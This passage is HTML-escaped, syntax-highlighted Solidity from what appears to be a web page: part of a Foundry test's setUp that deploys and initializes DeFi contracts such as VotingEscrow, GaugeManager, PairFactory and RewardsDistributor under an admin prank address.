class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xAD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRoleFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan 